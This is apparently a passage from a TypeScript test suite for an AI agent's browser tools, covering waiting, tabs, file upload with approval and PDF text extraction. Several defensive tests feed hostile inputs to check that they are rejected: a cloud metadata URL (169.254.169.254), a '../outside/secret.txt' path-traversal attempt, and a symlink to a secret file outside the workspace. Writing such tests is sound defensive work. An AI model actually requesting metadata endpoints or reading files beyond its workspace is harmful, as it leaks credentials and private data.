        captured = { needle: typeof arg === "string" ? arg : undefined, timeout: opts?.timeout };
        return undefined;
      }) as unknown as import("playwright-core").Page["waitForFunction"]
    } as Partial<import("playwright-core").Page>;
    browserTest.installFakeSessionWithPageForTest("wait-text", fakePage);

    const raw = await browserWaitFor("wait-text", { text: "Logged in", timeoutMs: 5000 });
    const parsed = JSON.parse(raw) as { success: boolean };
    expect(parsed.success).toBe(true);
    expect(captured).toBeDefined();
    expect(captured!.needle).toBe("Logged in");
    expect(captured!.timeout).toBe(5000);
  });

  test("surfaces a structured 'Wait timed out' error when waitFor throws timeout", async () => {
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("wait-timeout", fakePage);
    const loc = {
      waitFor: async () => {
        throw new Error("locator.waitFor: Timeout 2000ms exceeded.");
      }
    };
    const refs = new Map<string, unknown>();
    refs.set("@e1", loc);
    browserTest.setFakeSessionRefsForTest("wait-timeout", refs);

    const raw = await browserWaitFor("wait-timeout", { ref: "@e1", timeoutMs: 2000 });
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toMatch(/^Wait timed out after 2000ms/);
  });

  test("rejects when both ref and text are supplied", async () => {
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("wait-both", fakePage);
    const raw = await browserWaitFor("wait-both", { ref: "@e1", text: "Hello" });
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toMatch(/either 'ref' or 'text'/);
  });

  test("rejects when neither ref nor text is supplied", async () => {
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("wait-neither", fakePage);
    const raw = await browserWaitFor("wait-neither", {});
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toMatch(/either 'ref' or 'text'/);
  });

  test("rejects invalid state values", async () => {
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("wait-bad-state", fakePage);
    const raw = await browserWaitFor("wait-bad-state", { ref: "@e1", state: "bogus" });
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toMatch(/state.*visible.*hidden.*attached.*detached/i);
  });

  test("rejects invalid timeoutMs", async () => {
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("wait-bad-timeout", fakePage);
    const rawZero = await browserWaitFor("wait-bad-timeout", { ref: "@e1", timeoutMs: 0 });
    expect(JSON.parse(rawZero).error).toMatch(/positive number/);
    const rawNeg = await browserWaitFor("wait-bad-timeout", { ref: "@e1", timeoutMs: -100 });
    expect(JSON.parse(rawNeg).error).toMatch(/positive number/);
    const rawStr = await browserWaitFor("wait-bad-timeout", { ref: "@e1", timeoutMs: "10s" });
    expect(JSON.parse(rawStr).error).toMatch(/positive number/);
  });

  test("returns Unknown ref when the ref isn't planted", async () => {
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("wait-bad-ref", fakePage);
    const raw = await browserWaitFor("wait-bad-ref", { ref: "@e99" });
    expect(JSON.parse(raw).error).toContain("Unknown ref @e99");
  });
});

// Tabs tests need a fake context.pages() controllable from the test, plus a
// way to assert which page is currently active on the session after a swap.
// We use installFakeSessionWithPageAndContextForTest to plant both.
type FakeTabPage = Partial<import("playwright-core").Page> & {
  _label: string;
  _closed?: boolean;
};

function makeFakeTabPage(label: string, url: string): FakeTabPage {
  const page: FakeTabPage = {
    _label: label,
    url: () => url,
    title: () => Promise.resolve(`title:${label}`),
    evaluate: (async () => ({ entries: [], hiddenEmitted: 0, hiddenTotal: 0, hiddenBudget: 0 })) as unknown as import("playwright-core").Page["evaluate"],
    goto: (async () => null) as unknown as import("playwright-core").Page["goto"],
    bringToFront: (async () => undefined) as unknown as import("playwright-core").Page["bringToFront"],
    on: (() => undefined) as unknown as import("playwright-core").Page["on"],
    close: (async () => {
      page._closed = true;
    }) as unknown as import("playwright-core").Page["close"]
  };
  return page;
}

describe("browserTabs", () => {
  afterEach(() => {
    browserTest.clearFakeSessionsForTest();
    browserTest.setInFlightDisconnectsForTest(0);
  });

  test("list returns one entry per page with a stable tN handle and active flag", async () => {
    const p0 = makeFakeTabPage("p0", "https://a.example/");
    const p1 = makeFakeTabPage("p1", "https://b.example/");
    const pages = [p0, p1];
    const context: Partial<import("playwright-core").BrowserContext> = {
      pages: (() => pages) as unknown as import("playwright-core").BrowserContext["pages"],
      newPage: (async () => makeFakeTabPage("new", "about:blank")) as unknown as import("playwright-core").BrowserContext["newPage"]
    };
    browserTest.installFakeSessionWithPageAndContextForTest("tabs-list", p1, context);

    const raw = await browserTabs("tabs-list", { action: "list" });
    const parsed = JSON.parse(raw) as {
      success: boolean;
      url?: string;
      tabs?: Array<{ id: string; url: string; title: string; active: boolean }>;
    };
    expect(parsed.success).toBe(true);
    expect(parsed.url).toBe("https://b.example/");
    expect(parsed.tabs).toBeDefined();
    expect(parsed.tabs!.length).toBe(2);
    expect(parsed.tabs![0]!.id).toBe("t1");
    expect(parsed.tabs![0]!.url).toBe("https://a.example/");
    expect(parsed.tabs![0]!.active).toBe(false);
    expect(parsed.tabs![1]!.id).toBe("t2");
    expect(parsed.tabs![1]!.active).toBe(true);
  });

  test("new creates a page, swaps session.page, clears refs, and navigates if url given", async () => {
    const initial = makeFakeTabPage("initial", "https://a.example/");
    let gotoCalls: Array<{ url: string }> = [];
    const fresh = makeFakeTabPage("fresh", "https://c.example/");
    fresh.goto = (async (url: string) => {
      gotoCalls.push({ url });
      return null;
    }) as unknown as import("playwright-core").Page["goto"];
    const pages = [initial];
    const context: Partial<import("playwright-core").BrowserContext> = {
      pages: (() => pages) as unknown as import("playwright-core").BrowserContext["pages"],
      newPage: (async () => {
        pages.push(fresh);
        return fresh;
      }) as unknown as import("playwright-core").BrowserContext["newPage"]
    };
    browserTest.installFakeSessionWithPageAndContextForTest("tabs-new", initial, context);
    // Plant a stale ref so we can prove it gets cleared.
    const staleRefs = new Map<string, unknown>();
    staleRefs.set("@e1", { _stale: true });
    browserTest.setFakeSessionRefsForTest("tabs-new", staleRefs);

    const raw = await browserTabs("tabs-new", { action: "new", url: "https://c.example/" });
    const parsed = JSON.parse(raw) as { success: boolean; url?: string; id?: string };
    expect(parsed.success).toBe(true);
    expect(parsed.url).toBe("https://c.example/");
    // The response carries the new tab's stable handle so the model can
    // address it without re-listing.
    expect(parsed.id).toMatch(/^t\d+$/);
    expect(gotoCalls.length).toBe(1);
    expect(gotoCalls[0]!.url).toBe("https://c.example/");
    // session.page should have been swapped to the new tab.
    const activePage = browserTest.getFakeSessionPageForTest("tabs-new") as FakeTabPage | undefined;
    expect(activePage?._label).toBe("fresh");
    // Refs map should be a fresh empty map (we wrote a stale entry pre-call,
    // and snapshot on the fresh page returns no rows in our fake walker).
    const refs = browserTest.getFakeSessionRefsForTest("tabs-new");
    expect(refs?.size ?? 0).toBe(0);
  });

  test("new blocks a metadata URL via safetyCheck before opening anything", async () => {
    const initial = makeFakeTabPage("initial", "https://a.example/");
    let newPageCalls = 0;
    const context: Partial<import("playwright-core").BrowserContext> = {
      pages: (() => [initial]) as unknown as import("playwright-core").BrowserContext["pages"],
      newPage: (async () => {
        newPageCalls++;
        return makeFakeTabPage("blocked", "about:blank");
      }) as unknown as import("playwright-core").BrowserContext["newPage"]
    };
    browserTest.installFakeSessionWithPageAndContextForTest("tabs-block", initial, context);

    const raw = await browserTabs("tabs-block", { action: "new", url: "http://169.254.169.254/" });
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toMatch(/^Blocked:/);
    expect(newPageCalls).toBe(0);
  });

  test("switch swaps the active page by handle and clears refs", async () => {
    const p0 = makeFakeTabPage("p0", "https://a.example/");
    const p1 = makeFakeTabPage("p1", "https://b.example/");
    const pages = [p0, p1];
    const context: Partial<import("playwright-core").BrowserContext> = {
      pages: (() => pages) as unknown as import("playwright-core").BrowserContext["pages"],
      newPage: (async () => p0) as unknown as import("playwright-core").BrowserContext["newPage"]
    };
    browserTest.installFakeSessionWithPageAndContextForTest("tabs-switch", p0, context);
    // Handles are assigned lazily on list — t1=p0, t2=p1.
    await browserTabs("tabs-switch", { action: "list" });
    const stale = new Map<string, unknown>();
    stale.set("@e1", {});
    browserTest.setFakeSessionRefsForTest("tabs-switch", stale);

    const raw = await browserTabs("tabs-switch", { action: "switch", id: "t2" });
    const parsed = JSON.parse(raw) as { success: boolean };
    expect(parsed.success).toBe(true);
    const active = browserTest.getFakeSessionPageForTest("tabs-switch") as FakeTabPage | undefined;
    expect(active?._label).toBe("p1");
    expect(browserTest.getFakeSessionRefsForTest("tabs-switch")?.size ?? 0).toBe(0);
  });

  test("switch fails for an unknown handle and points the model at list", async () => {
    const p0 = makeFakeTabPage("p0", "https://a.example/");
    const context: Partial<import("playwright-core").BrowserContext> = {
      pages: (() => [p0]) as unknown as import("playwright-core").BrowserContext["pages"],
      newPage: (async () => p0) as unknown as import("playwright-core").BrowserContext["newPage"]
    };
    browserTest.installFakeSessionWithPageAndContextForTest("tabs-switch-bad", p0, context);
    const raw = await browserTabs("tabs-switch-bad", { action: "switch", id: "t5" });
    const error = JSON.parse(raw).error as string;
    expect(error).toContain("No tab with id t5");
    expect(error).toMatch(/list/);
  });

  test("close closes the page by handle, swaps if needed, and clears refs", async () => {
    const p0 = makeFakeTabPage("p0", "https://a.example/");
    const p1 = makeFakeTabPage("p1", "https://b.example/");
    const pages = [p0, p1];
    const context: Partial<import("playwright-core").BrowserContext> = {
      pages: (() => pages.filter((p) => !p._closed)) as unknown as import("playwright-core").BrowserContext["pages"],
      newPage: (async () => makeFakeTabPage("fresh-after-close", "about:blank")) as unknown as import("playwright-core").BrowserContext["newPage"]
    };
    // Active page is p1; we'll close it and expect the session to swap to p0.
    browserTest.installFakeSessionWithPageAndContextForTest("tabs-close-active", p1, context);
    await browserTabs("tabs-close-active", { action: "list" });
    const stale = new Map<string, unknown>();
    stale.set("@e1", {});
    browserTest.setFakeSessionRefsForTest("tabs-close-active", stale);

    const raw = await browserTabs("tabs-close-active", { action: "close", id: "t2" });
    const parsed = JSON.parse(raw) as { success: boolean };
    expect(parsed.success).toBe(true);
    expect(p1._closed).toBe(true);
    const active = browserTest.getFakeSessionPageForTest("tabs-close-active") as FakeTabPage | undefined;
    expect(active?._label).toBe("p0");
    expect(browserTest.getFakeSessionRefsForTest("tabs-close-active")?.size ?? 0).toBe(0);
  });

  test("close on the last tab opens a fresh tab so session.page isn't dangling", async () => {
    const only = makeFakeTabPage("only", "https://a.example/");
    let newPageCalls = 0;
    const after = makeFakeTabPage("after", "about:blank");
    const pages = [only];
    const context: Partial<import("playwright-core").BrowserContext> = {
      pages: (() => pages.filter((p) => !p._closed)) as unknown as import("playwright-core").BrowserContext["pages"],
      newPage: (async () => {
        newPageCalls++;
        pages.push(after);
        return after;
      }) as unknown as import("playwright-core").BrowserContext["newPage"]
    };
    browserTest.installFakeSessionWithPageAndContextForTest("tabs-close-last", only, context);
    await browserTabs("tabs-close-last", { action: "list" });

    const raw = await browserTabs("tabs-close-last", { action: "close", id: "t1" });
    const parsed = JSON.parse(raw) as { success: boolean };
    expect(parsed.success).toBe(true);
    expect(only._closed).toBe(true);
    expect(newPageCalls).toBe(1);
    const active = browserTest.getFakeSessionPageForTest("tabs-close-last") as FakeTabPage | undefined;
    expect(active?._label).toBe("after");
  });

  test("handles are stable across a close: t2 still addresses the same page after t1 closes", async () => {
    const p0 = makeFakeTabPage("p0", "https://a.example/");
    const p1 = makeFakeTabPage("p1", "https://b.example/");
    const p2 = makeFakeTabPage("p2", "https://c.example/");
    const pages = [p0, p1, p2];
    const context: Partial<import("playwright-core").BrowserContext> = {
      pages: (() => pages.filter((p) => !p._closed)) as unknown as import("playwright-core").BrowserContext["pages"],
      newPage: (async () => makeFakeTabPage("fresh", "about:blank")) as unknown as import("playwright-core").BrowserContext["newPage"]
    };
    browserTest.installFakeSessionWithPageAndContextForTest("tabs-stable", p2, context);
    await browserTabs("tabs-stable", { action: "list" }); // t1=p0, t2=p1, t3=p2

    const closeRaw = await browserTabs("tabs-stable", { action: "close", id: "t1" });
    expect(JSON.parse(closeRaw).success).toBe(true);
    // After closing t1, a positional scheme would now call p1 "tab 0" — the
    // stable handle t2 must still reach p1.
    const listRaw = await browserTabs("tabs-stable", { action: "list" });
    const listed = JSON.parse(listRaw) as { tabs?: Array<{ id: string; url: string }> };
    expect(listed.tabs!.map((t) => t.id)).toEqual(["t2", "t3"]);
    const switchRaw = await browserTabs("tabs-stable", { action: "switch", id: "t2" });
    expect(JSON.parse(switchRaw).success).toBe(true);
    const active = browserTest.getFakeSessionPageForTest("tabs-stable") as FakeTabPage | undefined;
    expect(active?._label).toBe("p1");
  });

  test("a closed tab's handle is never reused: a new tab gets a fresh handle and the old one stays dead", async () => {
    const p0 = makeFakeTabPage("p0", "https://a.example/");
    const p1 = makeFakeTabPage("p1", "https://b.example/");
    const fresh = makeFakeTabPage("fresh", "https://c.example/");
    const pages = [p0, p1];
    const context: Partial<import("playwright-core").BrowserContext> = {
      pages: (() => pages.filter((p) => !p._closed)) as unknown as import("playwright-core").BrowserContext["pages"],
      newPage: (async () => {
        pages.push(fresh);
        return fresh;
      }) as unknown as import("playwright-core").BrowserContext["newPage"]
    };
    browserTest.installFakeSessionWithPageAndContextForTest("tabs-no-reuse", p0, context);
    await browserTabs("tabs-no-reuse", { action: "list" }); // t1=p0, t2=p1

    await browserTabs("tabs-no-reuse", { action: "close", id: "t2" });
    const newRaw = await browserTabs("tabs-no-reuse", { action: "new" });
    const opened = JSON.parse(newRaw) as { success: boolean; id?: string };
    expect(opened.success).toBe(true);
    // The fresh tab must NOT inherit the retired t2 — the counter is monotonic.
    expect(opened.id).toBe("t3");
    const switchRaw = await browserTabs("tabs-no-reuse", { action: "switch", id: "t2" });
    expect(JSON.parse(switchRaw).error).toContain("No tab with id t2");
  });

  test("rejects an unknown action", async () => {
    const p0 = makeFakeTabPage("p0", "https://a.example/");
    const context: Partial<import("playwright-core").BrowserContext> = {
      pages: (() => [p0]) as unknown as import("playwright-core").BrowserContext["pages"],
      newPage: (async () => p0) as unknown as import("playwright-core").BrowserContext["newPage"]
    };
    browserTest.installFakeSessionWithPageAndContextForTest("tabs-bad-action", p0, context);
    const raw = await browserTabs("tabs-bad-action", { action: "fly" });
    expect(JSON.parse(raw).error).toMatch(/action.*list.*new.*switch.*close/);
  });

  test("rejects missing id on switch/close", async () => {
    const p0 = makeFakeTabPage("p0", "https://a.example/");
    const context: Partial<import("playwright-core").BrowserContext> = {
      pages: (() => [p0]) as unknown as import("playwright-core").BrowserContext["pages"],
      newPage: (async () => p0) as unknown as import("playwright-core").BrowserContext["newPage"]
    };
    browserTest.installFakeSessionWithPageAndContextForTest("tabs-missing-id", p0, context);
    const rawSwitch = await browserTabs("tabs-missing-id", { action: "switch" });
    expect(JSON.parse(rawSwitch).error).toMatch(/id.*tab handle/);
    const rawClose = await browserTabs("tabs-missing-id", { action: "close" });
    expect(JSON.parse(rawClose).error).toMatch(/id.*tab handle/);
  });
});

describe("browserUploadFile", () => {
  const UPLOAD_ROOT = "/tmp/gini-browser-upload-tests";
  const WORKSPACE = join(UPLOAD_ROOT, "workspace");
  const OUTSIDE = join(UPLOAD_ROOT, "outside");

  beforeEach(() => {
    rmSync(UPLOAD_ROOT, { recursive: true, force: true });
    mkdirSync(WORKSPACE, { recursive: true });
    mkdirSync(OUTSIDE, { recursive: true });
  });

  afterEach(() => {
    browserTest.clearFakeSessionsForTest();
    browserTest.setInFlightDisconnectsForTest(0);
    rmSync(UPLOAD_ROOT, { recursive: true, force: true });
  });

  test("uploads a workspace file via locator.setInputFiles using the realpath", async () => {
    writeFileSync(join(WORKSPACE, "upload.txt"), "hello\n");
    const fakePage = makeFakePageForRefTools("https://example.com/form");
    browserTest.installFakeSessionWithPageForTest("upload-ok", fakePage);
    let captured: { files?: unknown; timeout?: number } | undefined;
    const loc = {
      setInputFiles: async (files: unknown, opts?: { timeout?: number }) => {
        captured = { files, timeout: opts?.timeout };
      }
    };
    const refs = new Map<string, unknown>();
    refs.set("@e2", loc);
    browserTest.setFakeSessionRefsForTest("upload-ok", refs);

    const raw = await browserUploadFile("upload-ok", { ref: "@e2", path: "upload.txt" }, WORKSPACE);
    const parsed = JSON.parse(raw) as { success: boolean; path?: string };
    expect(parsed.success).toBe(true);
    expect(parsed.path).toBe("upload.txt");
    expect(captured).toBeDefined();
    expect(captured!.timeout).toBe(10_000);
    // realpath of /tmp/... resolves to /private/tmp/... on macOS, so we
    // only assert the file portion is correct and that the path was
    // run through realpath (i.e. it's absolute and ends with upload.txt).
    expect(typeof captured!.files).toBe("string");
    expect(String(captured!.files).endsWith("/upload.txt")).toBe(true);
  });

  test("rejects a path outside the workspace", async () => {
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("upload-escape", fakePage);
    const raw = await browserUploadFile(
      "upload-escape",
      { ref: "@e1", path: "../outside/secret.txt" },
      WORKSPACE
    );
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toMatch(/outside workspace/);
  });

  test("rejects a path that doesn't exist", async () => {
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("upload-missing", fakePage);
    const raw = await browserUploadFile(
      "upload-missing",
      { ref: "@e1", path: "nope.txt" },
      WORKSPACE
    );
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toMatch(/does not exist/);
  });

  test("rejects a path that points at a directory", async () => {
    mkdirSync(join(WORKSPACE, "subdir"));
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("upload-dir", fakePage);
    const raw = await browserUploadFile(
      "upload-dir",
      { ref: "@e1", path: "subdir" },
      WORKSPACE
    );
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toMatch(/not a file/);
  });

  test("rejects a symlink whose target resolves outside the workspace", async () => {
    writeFileSync(join(OUTSIDE, "secret.txt"), "top secret\n");
    symlinkSync(join(OUTSIDE, "secret.txt"), join(WORKSPACE, "evil-link.txt"));
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("upload-symlink", fakePage);
    let setInputCalls = 0;
    const loc = {
      setInputFiles: async () => {
        setInputCalls++;
      }
    };
    const refs = new Map<string, unknown>();
    refs.set("@e1", loc);
    browserTest.setFakeSessionRefsForTest("upload-symlink", refs);

    const raw = await browserUploadFile(
      "upload-symlink",
      { ref: "@e1", path: "evil-link.txt" },
      WORKSPACE
    );
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toMatch(/symlink/);
    // Must NOT have reached setInputFiles.
    expect(setInputCalls).toBe(0);
  });

  test("rejects missing ref argument", async () => {
    const raw = await browserUploadFile("upload-no-ref", { path: "x.txt" }, WORKSPACE);
    expect(JSON.parse(raw).error).toMatch(/ref/);
  });

  test("rejects missing path argument", async () => {
    const raw = await browserUploadFile("upload-no-path", { ref: "@e1" }, WORKSPACE);
    expect(JSON.parse(raw).error).toMatch(/path/);
  });

  test("returns Unknown ref when path is valid but ref isn't in the latest snapshot", async () => {
    writeFileSync(join(WORKSPACE, "ok.txt"), "ok\n");
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("upload-bad-ref", fakePage);
    const raw = await browserUploadFile(
      "upload-bad-ref",
      { ref: "@e99", path: "ok.txt" },
      WORKSPACE
    );
    expect(JSON.parse(raw).error).toContain("Unknown ref @e99");
  });
});

// Approved-upload executor: stale-stamp liveness pre-check. The stamp can
// be destroyed between approval and execution (a menu closing, an SPA
// re-render); the pre-check must fail immediately with snapshot guidance
// instead of hanging 10s in setInputFiles and surfacing a raw Playwright
// timeout — while the no-heal trust boundary stands (no re-resolution; see
// ADR browser-fill-secret.md). The path/symlink validation surface is
// covered by the browserUploadFile suite above (both share
// resolveUploadPath).
describe("browserUploadFileApproved", () => {
  const UPLOAD_ROOT = "/tmp/gini-browser-upload-approved-tests";
  const WORKSPACE = join(UPLOAD_ROOT, "workspace");

  beforeEach(() => {
    rmSync(UPLOAD_ROOT, { recursive: true, force: true });
    mkdirSync(WORKSPACE, { recursive: true });
    writeFileSync(join(WORKSPACE, "upload.txt"), "hello\n");
  });

  afterEach(() => {
    browserTest.clearFakeSessionsForTest();
    browserTest.setInFlightDisconnectsForTest(0);
    rmSync(UPLOAD_ROOT, { recursive: true, force: true });
  });

  function installUploadSession(taskId: string, loc: unknown): void {
    browserTest.installFakeSessionWithPageForTest(taskId, makeFakePageForRefTools("https://example.com/form"));
    const refs = new Map<string, unknown>();
    refs.set("@e2", loc);
    browserTest.setFakeSessionRefsForTest(taskId, refs);
  }

  test("fails fast with snapshot guidance when the stamped element vanished (count 0)", async () => {
    let setInputCalls = 0;
    installUploadSession("upload-approved-stale", {
      count: async () => 0,
      setInputFiles: async () => {
        setInputCalls++;
      }
    });

    const raw = await browserUploadFileApproved("upload-approved-stale", "@e2", WORKSPACE, "upload.txt");
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toContain("no longer on the page");
    expect(parsed.error).toContain("browser_snapshot");
    // Must never have reached setInputFiles.
    expect(setInputCalls).toBe(0);
  });

  test("a count() that throws reads as a lost stamp and fails fast", async () => {
    let setInputCalls = 0;
    installUploadSession("upload-approved-count-throw", {
      count: async () => {
        throw new Error("Execution context was destroyed");
      },
      setInputFiles: async () => {
        setInputCalls++;
      }
    });

    const raw = await browserUploadFileApproved("upload-approved-count-throw", "@e2", WORKSPACE, "upload.txt");
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toContain("no longer on the page");
    expect(setInputCalls).toBe(0);
  });

  test("a live stamped element (count > 0) proceeds to setInputFiles", async () => {
    let captured: { files?: unknown; timeout?: number } | undefined;
    installUploadSession("upload-approved-live", {
      count: async () => 1,
      setInputFiles: async (files: unknown, opts?: { timeout?: number }) => {
        captured = { files, timeout: opts?.timeout };
      }
    });

    const raw = await browserUploadFileApproved("upload-approved-live", "@e2", WORKSPACE, "upload.txt");
    const parsed = JSON.parse(raw) as { success: boolean; path?: string };
    expect(parsed.success).toBe(true);
    expect(parsed.path).toBe("upload.txt");
    expect(captured).toBeDefined();
    expect(captured!.timeout).toBe(10_000);
    expect(String(captured!.files).endsWith("/upload.txt")).toBe(true);
  });
});

// PDF detection at the navigation boundary: an application/pdf response
// returns extracted text (bounded to the snapshot char budget) instead of
// a useless viewer-DOM snapshot; extraction failures degrade to a
// structured `pdf: true` hint. The extractor is stubbed so the suite
// never loads pdfjs-dist.
describe("browserNavigate PDF handling", () => {
  // IP-literal host: skips the DNS pre-flight lookup, passes safetyCheck
  // (public documentation range).
  const PDF_URL = "https://203.0.113.5/invoice.pdf";

  function makePdfPage(opts: {
    contentType?: string;
    body?: (() => Promise<Uint8Array>) | null;
  } = {}): Partial<import("playwright-core").Page> {
    const response = {
      status: () => 200,
      headers: () => ({ "content-type": opts.contentType ?? "application/pdf" }),
      ...(opts.body === null ? {} : { body: opts.body ?? (async () => new TextEncoder().encode("%PDF-1.4 fake")) })
    };
    return {
      url: () => PDF_URL,
      title: async () => "invoice.pdf",
      goto: (async () => response) as unknown as import("playwright-core").Page["goto"],
      evaluate: (async () => ({ entries: [], hiddenEmitted: 0, hiddenTotal: 0, hiddenBudget: 0 })) as unknown as import("playwright-core").Page["evaluate"]
    } as Partial<import("playwright-core").Page>;
  }

  // Re-fetch tests stub the native fetch seam; the rejecting default
  // keeps an accidental fall-through from ever leaving the process
  // (no network in tests).
  const rejectingFetch = async (): Promise<Response> => {
    throw new Error("unexpected network fetch in test");
  };

  beforeEach(() => {
    browserTest.setPdfRefetchFetchForTest(rejectingFetch);
  });

  afterEach(() => {
    browserTest.clearFakeSessionsForTest();
    browserTest.setInFlightDisconnectsForTest(0);
    browserTest.setPdfTextExtractorForTest(null);
    browserTest.setPdfExtractMaxBytesForTest(null);
    browserTest.setPdfRefetchFetchForTest(null);
  });

  test("returns extracted text for an application/pdf response instead of a DOM snapshot", async () => {
    browserTest.setPdfTextExtractorForTest(async () => ({ text: "INVOICE TOTAL $42 due 2026-07-01" }));
    browserTest.installFakeSessionWithPageForTest("pdf-ok", makePdfPage());

    const raw = await browserNavigate("pdf-ok", { url: PDF_URL });
    const parsed = JSON.parse(raw) as { success: boolean; pdf?: boolean; pdfText?: string; snapshot?: string; status?: number };
    expect(parsed.success).toBe(true);
    expect(parsed.pdf).toBe(true);
    expect(parsed.status).toBe(200);
    expect(parsed.pdfText).toContain("INVOICE TOTAL $42");
    expect(parsed.snapshot).toBeUndefined();
  });

  test("bounds extracted text to the snapshot char budget with a counted marker", async () => {
    browserTest.setPdfTextExtractorForTest(async () => ({ text: "A".repeat(32_500) }));
    browserTest.installFakeSessionWithPageForTest("pdf-budget", makePdfPage());

    const raw = await browserNavigate("pdf-budget", { url: PDF_URL });
    const parsed = JSON.parse(raw) as { success: boolean; pdfText?: string; truncated?: boolean };
    expect(parsed.success).toBe(true);
    expect(parsed.truncated).toBe(true);
    expect(parsed.pdfText).toContain("[...PDF text truncated +500 more chars]");
    // 32_000 budget chars + the marker line.
    expect(parsed.pdfText!.length).toBeLessThan(32_100);
  });

  test("degrades to a structured hint when extraction fails", async () => {
    browserTest.setPdfTextExtractorForTest(async () => null);
    browserTest.installFakeSessionWithPageForTest("pdf-fail", makePdfPage());

    const raw = await browserNavigate("pdf-fail", { url: PDF_URL });
    const parsed = JSON.parse(raw) as { success: boolean; pdf?: boolean; pdfText?: string; note?: string };
    expect(parsed.success).toBe(true);
    expect(parsed.pdf).toBe(true);
    expect(parsed.pdfText).toBeUndefined();
    expect(parsed.note).toContain("text extraction was not possible");
    expect(parsed.note).toContain("do not re-snapshot");
  });

  test("skips extraction above the byte cap and says so", async () => {
    let extractorCalls = 0;
    browserTest.setPdfTextExtractorForTest(async () => {
      extractorCalls++;
      return { text: "should not run" };
    });
    browserTest.setPdfExtractMaxBytesForTest(8);
    browserTest.installFakeSessionWithPageForTest("pdf-cap", makePdfPage());

    const raw = await browserNavigate("pdf-cap", { url: PDF_URL });
    const parsed = JSON.parse(raw) as { success: boolean; pdf?: boolean; note?: string };
    expect(parsed.success).toBe(true);
    expect(parsed.pdf).toBe(true);
    expect(parsed.note).toContain("extraction cap");
    expect(extractorCalls).toBe(0);
  });

  test("re-fetches PDF bytes via native fetch when the response body is unavailable, carrying context cookies", async () => {
    // Chrome's PDF viewer intercepts main-frame PDF responses, so
    // response.body() throws (or returns viewer HTML — see the next test)
    // on real PDF navigations — the native re-fetch of the already-gated
    // final URL is the path real PDFs take. The browser context's cookies
    // for the URL ride along as a Cookie header so auth-gated PDFs work.
    browserTest.setPdfTextExtractorForTest(async (bytes) => ({ text: `extracted:${bytes.byteLength}` }));
    let fetchedUrl: string | undefined;
    let sentCookie: string | null | undefined;
    browserTest.setPdfRefetchFetchForTest(async (url, init) => {
      fetchedUrl = url;
      sentCookie = new Headers(init.headers).get("cookie");
      return new Response(new TextEncoder().encode("%PDF-1.4 real bytes"), { status: 200 });
    });
    browserTest.installFakeSessionWithPageAndContextForTest("pdf-refetch", makePdfPage({
      body: async () => {
        throw new Error("Protocol error (Network.getResponseBody): No resource with given identifier found");
      }
    }), {
      cookies: (async () => [
        { name: "session", value: "abc123" },
        { name: "tenant", value: "t-9" }
      ]) as unknown as import("playwright-core").BrowserContext["cookies"]
    });

    const raw = await browserNavigate("pdf-refetch", { url: PDF_URL });
    const parsed = JSON.parse(raw) as { success: boolean; pdf?: boolean; pdfText?: string };
    expect(parsed.success).toBe(true);
    expect(parsed.pdf).toBe(true);
    // The extractor ran on the re-fetched bytes ("%PDF-1.4 real bytes" = 19).
    expect(parsed.pdfText).toBe("extracted:19");
    expect(fetchedUrl).toBe(PDF_URL);
    expect(sentCookie).toBe("session=abc123; tenant=t-9");
  });

  test("re-fetches when the response body is the PDF viewer's HTML wrapper, not PDF bytes", async () => {
    // The other interception mode: response.body() resolves SUCCESSFULLY
    // with the viewer's HTML wrapper bytes. Only the %PDF- magic check
    // routes this case to the re-fetch — the throw/empty checks never fire.
    browserTest.setPdfTextExtractorForTest(async (bytes) => ({ text: `extracted:${bytes.byteLength}` }));
    let fetchedUrl: string | undefined;
    browserTest.setPdfRefetchFetchForTest(async (url) => {
      fetchedUrl = url;
      return new Response(new TextEncoder().encode("%PDF-1.4 real bytes"), { status: 200 });
    });
    browserTest.installFakeSessionWithPageForTest("pdf-viewer-html", makePdfPage({
      body: async () => new TextEncoder().encode("<!DOCTYPE html><html><body>viewer</body></html>")
    }));

    const raw = await browserNavigate("pdf-viewer-html", { url: PDF_URL });
    const parsed = JSON.parse(raw) as { success: boolean; pdf?: boolean; pdfText?: string };
    expect(parsed.success).toBe(true);
    expect(parsed.pdf).toBe(true);
    // The extractor ran on the re-fetched bytes ("%PDF-1.4 real bytes" = 19),
    // never on the HTML wrapper (48 bytes).
    expect(parsed.pdfText).toBe("extracted:19");
    expect(fetchedUrl).toBe(PDF_URL);
  });

  test("follows a re-fetch redirect to an allowed URL and extracts from the target", async () => {
    browserTest.setPdfTextExtractorForTest(async (bytes) => ({ text: `extracted:${bytes.byteLength}` }));
    const REDIRECT_TARGET = "https://203.0.113.6/storage/invoice-final.pdf";
